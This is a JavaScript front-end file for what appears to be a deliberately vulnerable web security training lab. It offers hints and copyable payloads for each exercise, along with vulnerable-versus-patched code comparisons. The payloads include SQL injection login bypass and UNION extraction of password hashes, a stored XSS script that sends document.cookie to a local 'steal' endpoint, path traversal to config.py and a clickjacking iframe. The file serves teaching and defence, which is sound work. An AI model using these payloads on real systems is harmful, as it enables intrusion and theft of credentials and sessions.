// static/sandbox.js
// VulnLab Frontend Logic: Theme Engine, Toast System, Guarded Intel Vault, and Code Diff

// 1. Theme Engine
function initTheme() {
    const saved = localStorage.getItem('vulnlab_theme') || 'dark';
    document.documentElement.setAttribute('data-theme', saved);
    updateThemeButton(saved);
}

function toggleTheme() {
    const current = document.documentElement.getAttribute('data-theme') || 'dark';
    const next = current === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', next);
    localStorage.setItem('vulnlab_theme', next);
    updateThemeButton(next);
}

function updateThemeButton(theme) {
    const btn = document.getElementById('theme-btn');
    if (btn) btn.innerHTML = theme === 'dark' ? '☀️ Light' : '🌙 Dark';
}

// 2. Modals Management
function openModal(id) {
    const el = document.getElementById(id);
    if (el) el.classList.add('active');
}

function closeModal(id) {
    const el = document.getElementById(id);
    if (el) el.classList.remove('active');
}

window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal-backdrop')) {
        e.target.classList.remove('active');
    }
});

// 3. Intelligence Vault Database
const INTEL_DATABASE = {
    'sqli.login': {
        concept: "Examine how the backend constructs the SQL query string upon receiving user input. Does it concatenate raw input directly into the query, or does it enforce parameterized separation?",
        vector: "Authentication bypass using SQL string boundary termination and logical operator injection (' OR '1'='1).",
        payload: "' OR '1'='1' -- "
    },
    'search.search': {
        concept: "In a search query with multiple columns, how can an attacker query a completely different table and append those results to the current result set?",
        vector: "UNION-based data extraction. Match the 3-column signature: (name, price, description) with (username, password_hash, 'x').",
        payload: "' UNION SELECT username, password_hash, 'x' FROM users -- "
    },
    'xss.comments': {
        concept: "Persistent data stored in the database is re-rendered to visitors. Does the rendering template engine enforce contextual HTML entity auto-escaping?",
        vector: "Stored Cross-Site Scripting (XSS) executing in the browser context of any visitor who loads the guestbook.",
        payload: "<script>fetch('http://127.0.0.1:9001/steal?c='+document.cookie)</script>"
    },
    'xss.search_reflected': {
        concept: "URL query parameters echoed immediately back onto the webpage without output encoding can execute arbitrary client-side code.",
        vector: "Reflected XSS delivered via crafted URL parameters.",
        payload: "<script>alert(document.cookie)</script>"
    },
    'csrf_module.profile': {
        concept: "State-changing POST requests that rely exclusively on ambient session cookies can be forged by external sites visited by the authenticated victim.",
        vector: "Cross-Site Request Forgery (CSRF) via auto-submitting hidden HTML forms.",
        payload: "Open attacks/csrf_attack.html in an external tab while authenticated."
    },
    'upload_module.upload': {
        concept: "Does the backend deeply analyze magic bytes / file signatures, or does it naively rely on client-supplied Content-Type headers and weak extension checks?",
        vector: "Insecure File Upload saving directly to publicly accessible static directories.",
        payload: "Execute: python attacks/upload_attack.py"
    },
    'dashboard': {
        concept: "Session IDs that are adopted before authentication and not cleared/regenerated allow attackers to pre-set user sessions.",
        vector: "Session Fixation and cookie hijacking due to missing HttpOnly flags.",
        payload: "Execute: python attacks/session_fixation.py"
    },
    'file_inclusion.view_doc': {
        concept: "Direct concatenation of user-supplied filenames to directory paths allows relative path dot traversal outside the document root.",
        vector: "Path Traversal and Local File Inclusion (LFI) via '../' climbing.",
        payload: "../config.py"
    },
    'security_headers.security_headers_view': {
        concept: "Missing defense-in-depth response headers allow third-party sites to frame the application in an invisible overlay.",
        vector: "Clickjacking / UI Redressing due to missing X-Frame-Options and Content-Security-Policy.",
        payload: "<iframe src='http://127.0.0.1:5000/profile'></iframe>"
    },
    'bruteforce.login_bruteforce': {
        concept: "Authentication endpoints without throttling or lockout thresholds can be systematically attacked using wordlists.",
        vector: "Credential guessing / dictionary brute-force.",
        payload: "Execute: python attacks/bruteforce_attack.py"
    },
    'recon.recon_workbench': {
        concept: "Overly descriptive crawler control files and exposed backup copies reveal sensitive endpoints to attackers.",
        vector: "Information disclosure via /robots.txt and /config.py.bak.",
        payload: "Visit: http://127.0.0.1:5000/robots.txt and /config.py.bak"
    }
};

// 4. Code Diffs Database
const CODE_DIFFS = {
    'sqli': `
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
        <strong>// VULNERABLE IMPLEMENTATION (Raw String Concatenation):</strong><br>
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"<br>
        result = db.session.execute(text(query)).fetchone()
    </div>
    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
        <strong>// PATCHED IMPLEMENTATION (Parameterized ORM):</strong><br>
        user = User.query.filter_by(username=username).first()<br>
        if user and check_password_hash(user.password_hash, password):<br>
        &nbsp;&nbsp;&nbsp;&nbsp;# Safe authenticated session
    </div>
</div>`,
    'xss': `
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
        <strong>// VULNERABLE TEMPLATE SINK (Auto-escaping Disabled):</strong><br>
        &lbrace;&lbrace; comment.text | safe &rbrace;&rbrace;
    </div>
    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
        <strong>// PATCHED TEMPLATE SINK (Contextual HTML Escaping):</strong><br>
        &lbrace;&lbrace; comment.text &rbrace;&rbrace;
    </div>
</div>`,
    'traversal': `
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
        <strong>// VULNERABLE (Unsanitized Path Concatenation):</strong><br>
        target_path = os.path.join(DOCS_DIR, filename)<br>
        with open(target_path, 'r') as f: content = f.read()
    </div>
    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
        <strong>// PATCHED (safe_join Boundary Verification + Whitelist):</strong><br>
        safe_path = safe_join(DOCS_DIR, filename)<br>
        if not safe_path or filename not in ALLOWED_DOCS:<br>
        &nbsp;&nbsp;&nbsp;&nbsp;return "Access Denied", 403
    </div>
</div>`,
    'bruteforce': `
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
        <strong>// VULNERABLE:</strong><br>
        # No attempt tracking, delays, or lockout controls.
    </div>
    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
        <strong>// PATCHED (Sliding-Window Rate Limiter):</strong><br>
        attempts = FAILED_ATTEMPTS.get(client_ip, [])<br>
        if len(attempts) >= 5:<br>
        &nbsp;&nbsp;&nbsp;&nbsp;return "HTTP 429: Account locked for 60 seconds", 429
    </div>
</div>`,
    'csrf': `
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.85em;">
    <div style="color: #fb7185; background: rgba(244, 63, 94, 0.1); padding: 12px; border-radius: 6px; margin-bottom: 12px; border-left: 3px solid var(--rose);">
        <strong>// VULNERABLE:</strong><br>
        # Relies purely on ambient cookie with no token or SameSite enforcement.
    </div>
    <div style="color: #34d399; background: rgba(16, 185, 129, 0.1); padding: 12px; border-radius: 6px; border-left: 3px solid var(--emerald);">
        <strong>// PATCHED:</strong><br>
        SESSION_COOKIE_SAMESITE = 'Strict'<br>
        CSRFProtect(app)
    </div>
</div>`
};

// 5. Intel Vault Modal Controller
function openIntelVault() {
    const ep = window.CURRENT_ENDPOINT || '';
    const intel = INTEL_DATABASE[ep] || {
        concept: "Focus on the input parameters and how the backend handles client data.",
        vector: "Standard web application attack surface.",
        payload: "Consult documentation for manual vectors."
    };

    const conceptEl = document.getElementById('intel-concept');
    const vectorEl = document.getElementById('intel-vector');
    const payloadEl = document.getElementById('intel-payload');

    if (conceptEl) conceptEl.innerText = intel.concept;
    if (vectorEl) vectorEl.innerText = intel.vector;
    if (payloadEl) payloadEl.innerText = intel.payload;
    
    ['tier-1', 'tier-2', 'tier-3'].forEach(t => {
        const el = document.getElementById(t);
        const icon = document.getElementById(t + '-icon');
        if (el) el.classList.remove('unlocked');
        if (icon) icon.innerText = '▶';
    });

    const lockedEl = document.getElementById('tier-3-locked');
    const unlockedEl = document.getElementById('tier-3-unlocked');
    if (lockedEl) lockedEl.style.display = 'block';
    if (unlockedEl) unlockedEl.style.display = 'none';

    openModal('intel-modal');
}

function toggleTier(tierId) {
    const content = document.getElementById(tierId);
    const icon = document.getElementById(tierId + '-icon');
    if (!content) return;
    if (content.classList.contains('unlocked')) {
        content.classList.remove('unlocked');
        if (icon) icon.innerText = '▶';
    } else {
        content.classList.add('unlocked');
        if (icon) icon.innerText = '▼';
    }
}

function unlockPayload() {
    const lockedEl = document.getElementById('tier-3-locked');
    const unlockedEl = document.getElementById('tier-3-unlocked');
    if (lockedEl) lockedEl.style.display = 'none';
    if (unlockedEl) unlockedEl.style.display = 'block';
    showToast('Exploit payload unlocked in Intel Vault.', 'info');
}

function copyPayload() {
    const textEl = document.getElementById('intel-payload');
    if (!textEl) return;
    navigator.clipboard.writeText(textEl.innerText).then(() => {
        showToast('Payload copied to clipboard!', 'info');
    });
}

function openCodeDiff(feature) {
    const diffHtml = CODE_DIFFS[feature] || '<p style="color: var(--text-muted);">Detailed code inspection available in DEVELOPER_DOCS.md.</p>';
    const contentEl = document.getElementById('diff-content');
    if (contentEl) contentEl.innerHTML = diffHtml;
    openModal('diff-modal');
}

// 6. Toast Notification Engine
function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    let icon = 'ℹ️';
    if (type === 'waf') icon = '🛡️';
    if (type === 'solved') icon = '🎉';
    
    toast.innerHTML = `
        <span style="font-size: 1.2em;">${icon}</span>
        <span style="font-size: 0.88em; font-weight: 500; color: var(--text-main);">${message}</span>
    `;
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(50px)';
        setTimeout(() => toast.remove(), 250);
    }, 4000);
}

function toggleActiveModule(feature) {
    fetch('/admin/toggle/' + feature, { method: 'POST' })
        .then(r => r.json())
        .then(res => {
            if (res.status === 'success') {
                window.location.reload();
            }
        })
        .catch(err => alert('Failed to toggle module: ' + err));
}

function resetLabData() {
    if (confirm("Reset all database tables, uploaded files, and WAF detection logs to pristine initial state?")) {
        fetch('/admin/reset_lab', { method: 'POST' })
            .then(r => r.json())
            .then(res => {
                alert(res.message);
                window.location.reload();
            })
            .catch(err => alert('Error resetting lab: ' + err));
    }
}

// Initialize theme on DOM load
document.addEventListener('DOMContentLoaded', initTheme);
